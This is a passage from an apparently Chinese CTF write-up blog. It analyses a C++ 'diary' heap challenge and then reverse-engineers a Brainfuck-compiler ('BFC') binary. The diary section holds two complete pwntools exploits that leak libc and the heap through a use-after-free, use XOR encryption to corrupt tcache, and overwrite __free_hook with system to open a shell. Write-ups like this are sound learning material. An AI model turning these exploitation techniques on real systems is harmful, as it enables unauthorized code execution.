class="hljs-string">&quot;input your test cmd:&quot;</span>,payload)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    payload = <span class="hljs-string">&quot;delete#&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(idx)<br>    s.sendlineafter(<span class="hljs-string">&quot;input your test cmd:&quot;</span>,payload)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">enc</span>(<span class="hljs-params">idx,offset,length</span>):</span><br>    payload = <span class="hljs-string">&quot;encrypt#&#123;&#125;#&#123;&#125;#&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(idx,offset,length)<br>    s.sendlineafter(<span class="hljs-string">&quot;input your test cmd:&quot;</span>,payload)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dec</span>(<span class="hljs-params">idx</span>):</span><br>    payload = <span class="hljs-string">&quot;decrypt#&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(idx)<br>    s.sendlineafter(<span class="hljs-string">&quot;input your test cmd:&quot;</span>,payload)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params">addr</span>):</span><br>    gdb.attach(s,<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b *$rebase(&#123;&#125;)</span><br><span class="hljs-string">    set $datevec=*(size_t *)$rebase(0x162F0)</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>    add(i,<span class="hljs-built_in">str</span>(i))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    free(<span class="hljs-number">10</span>-i)<br><br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">3</span>)<br>s.recvuntil(<span class="hljs-string">&quot;2022.10.12 0:0:4\n&quot;</span>)<br>heap = u64(s.recvline(keepends=<span class="hljs-literal">False</span>)+<span class="hljs-string">&quot;\x00\x00&quot;</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">2</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br>libc.address = u64(s.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:]+<span class="hljs-string">&#x27;\x00\x00&#x27;</span>)-<span class="hljs-number">0x1ecbe0</span><br>success(<span class="hljs-built_in">hex</span>(libc.address))<br>success(<span class="hljs-built_in">hex</span>(heap))<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x8</span>+p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]-<span class="hljs-number">4</span>))<br>enc(<span class="hljs-number">0</span>,<span class="hljs-number">12</span>,<span class="hljs-number">6</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;A&#x27;</span>*(<span class="hljs-number">0x2c0</span>-<span class="hljs-number">0x16</span>))<br>add(<span class="hljs-number">40</span>,<span class="hljs-string">&#x27;/bin/sh;&#x27;</span>)<br><br>add(<span class="hljs-number">41</span>,p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])[:<span class="hljs-number">6</span>])<br>free(<span class="hljs-number">4</span>)<br><span class="hljs-comment"># debug(0x4299)</span><br>free(<span class="hljs-number">3</span>)<br><br>s.interactive()<br></code></pre></div></td></tr></table></figure>

<h3 id="wp2"><a href="#wp2" class="headerlink" title="wp2"></a><a target="_blank" rel="noopener" href="https://www.ctfiot.com/85535.html">wp2</a></h3><p>delete函数存在uaf，可以利用这个特点来泄露libc和改fd，堆风水比较复杂，造出tcache和unsorted bin重合后，利用encrypt函数里的calloc机制可以改fd，打mallochook即可</p>
<p>更难看懂……..看起来有onegadget, 算了不研究了, 官方wp看了就得了, 这一题看了老久了看不下去了. </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">略. <br></code></pre></div></td></tr></table></figure>

<h3 id="wp-intended"><a href="#wp-intended" class="headerlink" title="wp intended"></a>wp intended</h3><p>The logic of the erase function of vector is as follows:</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function">iterator <span class="hljs-title">erase</span><span class="hljs-params">(iterator position)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(position + <span class="hljs-number">1</span> != <span class="hljs-built_in">end</span>())<br>        <span class="hljs-built_in">copy</span>(position + <span class="hljs-number">1</span>, finish, position); <span class="hljs-comment">//copy range [position+1,end) into position, so 非常昂贵.</span><br>    --finish;<br>    <span class="hljs-built_in">destroy</span>(finish);<br>    <span class="hljs-keyword">return</span> position;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>If the <code>=</code> operation is not rewritten for the class, the function will call the default operation, that is, directly copy all the contents of the class. if there is a pointer, it will also be copied directly.</p>
<p>So at the time of <code>destroy(finish);</code>, if the pointer in the class is freed in the destructor, then the copied pointer points to a memory that has been freed.</p>
<p>Here is an example:</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">A</span>()&#123;<br>        a = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[<span class="hljs-number">0x100</span>];<br>        cout &lt;&lt; <span class="hljs-string">&quot;Call A()&quot;</span> &lt;&lt; endl;<br>    &#125;<br>    ~<span class="hljs-built_in">A</span>() &#123;<br>        <span class="hljs-keyword">delete</span> [] a;<br>        cout &lt;&lt; <span class="hljs-string">&quot;Call ~A();&quot;</span> &lt;&lt; endl;<br>    &#125;<br>    <span class="hljs-keyword">char</span>* a;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-function">vector&lt;A&gt; <span class="hljs-title">vec_A</span><span class="hljs-params">(<span class="hljs-number">3</span>)</span></span>;<br>    vec_A.<span class="hljs-built_in">erase</span>(vec_A.<span class="hljs-built_in">begin</span>());<br>    <span class="hljs-comment">//after this line, the result is the destructor is called twice. </span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>The vulnerability of the challenge is in the delete command. If it is not the last idx deleted, then there will be a pointer pointing the freed chunk, which can be used to leak data with the <code>show</code> command. But it needs to leak the random number before rewritten tcache bins’ fd. Then use the xor in the encryption function to xor the fd of the released chunk into the desired address.</p>
<p>The random numbers are initialized at the beginning, and they will be used in a subsequent cycle. The length is 0x200, so as long as the content of a normal content is encrypted, the random number can be obtained. It should be noted here that the <code>show</code> command will be truncated by ‘\x00’, so multiple encryptions and shows may be necessary to get complete random numbers.</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">year,month,day,hour,minutes,sec,content</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;cmd:&quot;</span>)<br>    cmd = <span class="hljs-string">&#x27;add#&#x27;</span><br>    cmd += <span class="hljs-built_in">str</span>(year) + <span class="hljs-string">&#x27;#&#x27;</span> + <span class="hljs-built_in">str</span>(month) + <span class="hljs-string">&#x27;#&#x27;</span> + <span class="hljs-built_in">str</span>(day) + <span class="hljs-string">&#x27;#&#x27;</span> + <span class="hljs-built_in">str</span>(hour) + <span class="hljs-string">&#x27;#&#x27;</span> + <span class="hljs-built_in">str</span>(minutes) + <span class="hljs-string">&#x27;#&#x27;</span> + <span class="hljs-built_in">str</span>(sec) + <span class="hljs-string">&#x27;#&#x27;</span> + content<br>    p.sendline(cmd)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;cmd:&quot;</span>)<br>    cmd = <span class="hljs-string">&#x27;show#&#x27;</span> + <span class="hljs-built_in">str</span>(idx)<br>    p.sendline(cmd)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;cmd:&quot;</span>)<br>    cmd = <span class="hljs-string">&#x27;delete#&#x27;</span> + <span class="hljs-built_in">str</span>(idx)<br>    p.sendline(cmd)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update</span>(<span class="hljs-params">idx,content</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;cmd:&quot;</span>)<br>    cmd = <span class="hljs-string">&#x27;update#&#x27;</span> + <span class="hljs-built_in">str</span>(idx) + <span class="hljs-string">&#x27;#&#x27;</span> + content<br>    p.sendline(cmd)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params">idx</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;cmd:&quot;</span>)<br>    cmd = <span class="hljs-string">&#x27;decrypt#&#x27;</span> + <span class="hljs-built_in">str</span>(idx)<br>    p.sendline(cmd)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">idx,offset,length</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;cmd:&quot;</span>)<br>    cmd = <span class="hljs-string">&#x27;encrypt#&#x27;</span> + <span class="hljs-built_in">str</span>(idx) + <span class="hljs-string">&#x27;#&#x27;</span> + <span class="hljs-built_in">str</span>(offset) + <span class="hljs-string">&#x27;#&#x27;</span> + <span class="hljs-built_in">str</span>(length)<br>    p.sendline(cmd)<br><br><span class="hljs-comment"># p = process(&quot;./diary&quot;)</span><br>ip = <span class="hljs-string">&quot;x.x.x.x&quot;</span><br>p = remote(ip,<span class="hljs-number">10111</span>)<br><span class="hljs-comment"># gdb.attach(p)</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):    <span class="hljs-comment"># idx locate 0-10</span><br>    add(<span class="hljs-number">1971</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">23</span>,<span class="hljs-number">22</span>,<span class="hljs-number">20</span>+i,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>,<span class="hljs-number">3</span>,-<span class="hljs-number">1</span>): <span class="hljs-comment"># free 4-10, filled up tcache chunk of size 0x200</span><br>    delete(i)<br><br>delete(<span class="hljs-number">0</span>) <span class="hljs-comment"># left 1 2 3, thus 3 is freed unexpectedly</span><br>show(<span class="hljs-number">2</span>) <span class="hljs-comment"># freed 3 is moved to 2.</span><br><br>p.recvuntil(<span class="hljs-string">&quot;1971.12.12 23:22:23\n&quot;</span>)<br><br>leak_value = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#recieve unsorted fd, where points to libc</span><br><br>info(<span class="hljs-string">&quot;leak_value: &quot;</span> + <span class="hljs-built_in">hex</span>(leak_value))<br><br>__free_hook_ = leak_value + <span class="hljs-number">0x2268</span> - <span class="hljs-number">0xd</span> <span class="hljs-comment">#constant offset</span><br>system = leak_value - <span class="hljs-number">0x19a950</span> <br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>): <span class="hljs-comment">#get 5 chunks from tcache</span><br>    add(<span class="hljs-number">1971</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">23</span>,<span class="hljs-number">22</span>,<span class="hljs-number">40</span>+i,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">6</span>)<br>p.recvuntil(<span class="hljs-string">&quot;23:22:44\n&quot;</span>)<br>heap_value = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<span class="hljs-comment"># just tcache pointing to heap area</span><br>info(<span class="hljs-string">&quot;heap_value: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_value))<br><br><span class="hljs-comment">#now, 2 3(free in unsorted) 1&#x27; 2&#x27; 3&#x27; 4&#x27; 5&#x27;(free in tcache)</span><br><span class="hljs-comment">#     0 1                   2  3  4  5  6</span><br><span class="hljs-comment"># now tcache: 5&#x27; 9 10      unsorted: 3</span><br>need_random_value = heap_value ^ __free_hook_ <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    update(<span class="hljs-number">0</span>,<span class="hljs-built_in">chr</span>(need_random_value&amp;<span class="hljs-number">0xff</span>)*<span class="hljs-number">0x200</span>)<br><span class="hljs-comment">####add ? byte into enc vector</span><br>    encrypt(<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0x200</span>)    <span class="hljs-comment"># will calloc 0x200 bytes space</span><br>    show(<span class="hljs-number">0</span>)<br>    data = p.recvuntil(<span class="hljs-string">&quot;input&quot;</span>)<br>    data = data[:-<span class="hljs-number">6</span>]<br>    data = data[<span class="hljs-number">25</span>:]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0x200</span>:<br>        exit()<br>    <span class="hljs-comment">#到这里说明随机字节串中出现了和想要xor的字节相同的数值. 利用这个字节(相同数字xor后为0无法printf)去xor一个字节如line83. </span><br>    update(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x200</span>)<br>    encrypt(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(data)) <span class="hljs-comment">#not fit exist tcache size, get from top chunk</span><br>    encrypt(<span class="hljs-number">6</span>,i,<span class="hljs-number">1</span>) <span class="hljs-comment">#get 0x20 bytes from top. WHY??</span><br>    <span class="hljs-comment">#我觉得这一大堆加密不是为了heap布局, 而是为了对一块区域使用xor. </span><br>    update(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x200</span>)<br>    encrypt(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x1FF</span>-<span class="hljs-built_in">len</span>(data)) <span class="hljs-comment">#also not fit in. WHY??</span><br>    need_random_value = need_random_value &gt;&gt; <span class="hljs-number">8</span><br><br><br>add(<span class="hljs-number">1972</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">23</span>,<span class="hljs-number">22</span>,<span class="hljs-number">40</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>pause()<br>add(<span class="hljs-number">1972</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">23</span>,<span class="hljs-number">22</span>,<span class="hljs-number">41</span>,<span class="hljs-string">&#x27;;/bin/sh;&#x27;</span> + <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> p64(system)]))<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure>

<p>折腾了一会儿的调试环境, 发现使用docker调试要装git pwntools python gdb peda, 受不了. </p>
<ul>
<li>姑且试了了在container里面调试, 改写compose.yaml以及换源, </li>
</ul>
<p>转到ubuntu2004虚拟机上继续. 主要就是想知道heap环境是否和我想的一样. 果然不一样, 忘记了0x300和0x200的区别. </p>
<ul>
<li>注意到substr中构造了新的string, 使用了<code>operator *</code>也就是malloc函数, 这是和普通的c程序(而且禁用了IO缓冲区的那种)不一样的地方, 多了很多意料之外的heap操作, 要谨慎选择布局中使用的chunk大小. </li>
<li>其中54行的减去0xd是指add后最开始四个空格加上<code>;/bin/sh;</code>的长度, 好让line93的system地址能够放在<code>__free_hook</code>上</li>
<li>free_hook最终被main函数<strong>最后</strong>的string析构函数调用, 而析构的正是我们输入的命令字符串, 所以exp执行完会出现<br><code>sh : 1 : add#a#b#... not a command</code>这样的提示, 之后就可以快乐<code>cat /flag</code>了. </li>
</ul>
<p>主要卡在了xor实际上是一种任意写, 只要和循环使用的随机数字配合好(指循环查找相同数值)即可. 然后<code>__free_hook</code>可以被析构函数调用. </p>
<h2 id="BFC"><a href="#BFC" class="headerlink" title="BFC"></a>BFC</h2><blockquote>
<p>仍然是C++逆向</p>
</blockquote>
<ul>
<li>7.5版本老是自动识别不了switch跳转表. 换成新版反编译又有点慢. 挺难受的.</li>
<li>出现了deque双端队列的使用. 写在Diary中. </li>
<li>一个地址编码计算看了好一会儿…不太敢意会, 还是准确一点. </li>
<li>居然是2.35的libc, 而且瞄到了tcache利用, 不是有那个啥保护么. 难搞哦. </li>
<li>看init函数的时候查着查着又看到ABI, 因为<a target="_blank" rel="noopener" href="https://refspecs.linuxbase.org/LSB_5.0.0/LSB-Core-generic/LSB-Core-generic/baselib---cxa-atexit.html"><code>__cxa_atexit</code></a>对应着<a target="_blank" rel="noopener" href="https://itanium-cxx-abi.github.io/cxx-abi/abi.html#dso-dtor-runtime-api">标准的这里</a>:<br><code>int __cxa_atexit(void (*func) (void *), void * arg, void * dso_handle);</code><br>那么有个<code>atexit()</code>又是个啥? <code>atexit()</code> does not deal at all with the ability in most implementations to remove [Dynamic Shared Objects] from a running program image by calling <code>dlclose</code> prior to program termination.</li>
<li>差点忘了create function. </li>
<li>终于知道IDA里rodata段的函数为什么会是<code>call    near ptr sub_5555555591E0+1</code>这种操作了, 因为被当做字符串了, 几个函数之间有空字符充当结束符和对齐字节. </li>
<li>2.34+的libc无法使用pwndbg的heap等指令, 因为一个宏定义被修改了. <a target="_blank" rel="noopener" href="https://github.com/pwndbg/pwndbg/pull/953/files">issue</a>在这里</li>
<li><code>probeleak</code> <code>xinfo</code>神奇pwndbg命令. </li>
</ul>
<h3 id="经验总结"><a href="#经验总结" class="headerlink" title="经验总结:"></a>经验总结:</h3><ul>
<li>被deque卡住. 看了STL之后熟悉了很多. 下次遇到set mutiset hashmap又得卡. 算了到时候再说. </li>
<li>以后可以先看看<code>.init_array</code>段中出现的构造函数, 看看有没有用的全局变量提示. 就如这里的<code>unkn_string_arr</code>. </li>
<li><strong>动静态相结合</strong>可以更快的看出代码的意图. 就比如最重要执行的代码区域的样子, 前面229字节然后一堆call指令, 直接观察call什么地址. </li>
</ul>
<h3 id="流程-1"><a href="#流程-1" class="headerlink" title="流程:"></a>流程:</h3><p>init:</p>
<ul>
<li><p>第一个buf_16存放一个0x10堆块指针(可以改变). 最终在main的最后把buf_16的地址也就是0x55555555C460作为参数. 难怪有什么a1[5]这种引用. </p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">.bss:<span class="hljs-number">0x00055555555C460</span> [<span class="hljs-number">0</span>] buf_16          dq ?                    ; DATA XREF: init+<span class="hljs-number">97</span>↑w<br>.bss:<span class="hljs-number">0x00055555555C460</span>                                         ; main+<span class="hljs-number">15</span>C↑o<br>.bss:<span class="hljs-number">0x00055555555C468</span> [<span class="hljs-number">1</span>] init_16         dq ?                    ; DATA XREF: init+<span class="hljs-number">9</span>E↑w    <span class="hljs-comment">//初始化为16, 下同. </span><br>.bss:<span class="hljs-number">0x00055555555C470</span> [<span class="hljs-number">2</span>] init_0          dq ?                    ; DATA XREF: init+A9↑w<br>.bss:<span class="hljs-number">0x00055555555C478</span> [<span class="hljs-number">3</span>] mapped_addr_2   dq ?                    ; DATA XREF: init+C6↑w<br>.bss:<span class="hljs-number">0x00055555555C480</span> [<span class="hljs-number">4</span>] malloc_addr     dq ?                    ; DATA XREF: init+D4↑w<br>.bss:<span class="hljs-number">0x00055555555C488</span> [<span class="hljs-number">5</span>] free_addr       dq ?                    ; DATA XREF: init+E2↑w<br>.bss:<span class="hljs-number">0x00055555555C490</span> [<span class="hljs-number">6</span>] memcpy_addr     dq ?                    ; DATA XREF: init+F0↑w<br>.bss:<span class="hljs-number">0x00055555555C498</span> [<span class="hljs-number">7</span>] init_2          dq ?                    ; DATA XREF: init+B4↑w<br></code></pre></div></td></tr></table></figure></li>
<li><p>使用了<code>unkn_string_arr</code>, 把一堆指令复制到了mapped_addr的前面一部分, 也就是说<code>map_str_len</code>从一开始就是229. 而流程中的call指令都是往回跳. </p>
</li>
</ul>
<p>main中switch: </p>
<ul>
<li><p>空白符结束. </p>
</li>
<li><p>输入字符串编码成指令, 前几个都是call指令, 跳到<code>cur_len+数字+4</code>的位置. 到方括号就有条件跳转.</p>
<ul>
<li><code>+</code> call 0x24C <code>++buf_16[init_0];</code> </li>
<li><code>, </code> 268 <code>sys_read(0, init_0 + buf_16, 1uLL);</code> </li>
<li><code>-</code> 259 <code>--buf_16[init_0];</code> </li>
<li><code>.</code> 288 <code>sys_write(1, buf_16 + init_16, 1uLL);</code>  </li>
<li><code>&lt;</code> E0_plus_2 <code>(&amp;sub_5555555591E0)(a1); --init_0;</code> </li>
<li><code>&gt; </code> E0_plus_1 <code>(&amp;sub_5555555591E0)(a1); ++init_0;</code> </li>
<li><code>?</code> 2B5 见下面代码 使用<code>init_2</code> </li>
</ul>
</li>
<li><p>左方括号</p>
<ul>
<li>call 2A7 <code>buf_16[init_0] == 0</code> </li>
<li>je ??? 6bytes</li>
<li>push back start_pos</li>
</ul>
</li>
<li><p>右方括号</p>
<ul>
<li>jmp start_pos 5bytes</li>
<li>把左方括号的je跳转到下一条指令.</li>
</ul>
</li>
</ul>
<img src="../../image/recent_ctf/image-20230129185730706.png" srcset="/img/loading.gif" lazyload alt="image-20230129185730706" style="zoom: 50%;" />

<ul>
<li>结尾加上retn, 然后使用在init中初始化的buf_16(0x10字节没有初r值)作为参数执行输入字符串所代表的指令, 注意229字节之前都是那一堆rodata的指令. </li>
</ul>
<h3 id="几个预置函数"><a href="#几个预置函数" class="headerlink" title="几个预置函数:"></a>几个预置函数:</h3><ul>
<li>0x5555555591E0 <del>什么玩意儿这是</del>. </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">sub_5555555591E0</span><span class="hljs-params">(__int64 *a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 v2; <span class="hljs-comment">// [rsp+0h] [rbp-10h]</span><br><br>  <span class="hljs-keyword">if</span> ( init_16 &lt;= init_0 + <span class="hljs-number">1</span> )<br>  &#123;<br>    new_buf = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">2</span> * init_16);<br>    <span class="hljs-built_in">memcpy</span>(new_buf, buf_16, init_16);<br>    <span class="hljs-built_in">free</span>(buf_16);<br>    buf_16 = new_buf;<br>    init_16 *= <span class="hljs-number">2</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> ???;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<ul>
<li>E0_plus_1 <code>(&amp;sub_5555555591E0)(a1); ++init_0;</code> </li>
<li>E0_plus_2 <code>(&amp;sub_5555555591E0)(a1); --init_0;</code> </li>
<li>24C <code>++*(char*)(buf_16 + init_0);</code> </li>
<li>259 <code>--*(char*)(buf_16 + init_0);</code> </li>
<li>268 <code>sys_read(0, init_0 + buf_16, 1uLL);</code> </li>
<li>288 <code>sys_write(1, buf_16 + init_16, 1uLL);</code> </li>
<li>2A7 ??????? 后接一个je指令, 所以这是判断<code>*(buf_16+init_0) == 0</code> </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">.rodata:<span class="hljs-number">00005555555592</span>A7 <span class="hljs-number">48</span> <span class="hljs-number">8B</span> <span class="hljs-number">07</span>                                   mov     rax, [rdi]<br>.rodata:<span class="hljs-number">00005555555592</span>AA <span class="hljs-number">48</span> <span class="hljs-number">8B</span> <span class="hljs-number">5F</span> <span class="hljs-number">10</span>                                mov     rbx, [rdi+<span class="hljs-number">10</span>h]<br>.rodata:<span class="hljs-number">00005555555592</span>AE <span class="hljs-number">8</span>A <span class="hljs-number">0</span>C <span class="hljs-number">18</span>                                   mov     cl, [rax+rbx]<br>.rodata:<span class="hljs-number">00005555555592B</span>1 <span class="hljs-number">20</span> C9                                      <span class="hljs-keyword">and</span>     cl, cl<br>.rodata:<span class="hljs-number">00005555555592B</span>3 C3                                         retn<br></code></pre></div></td></tr></table></figure>

<ul>
<li>2B5</li>
</ul>
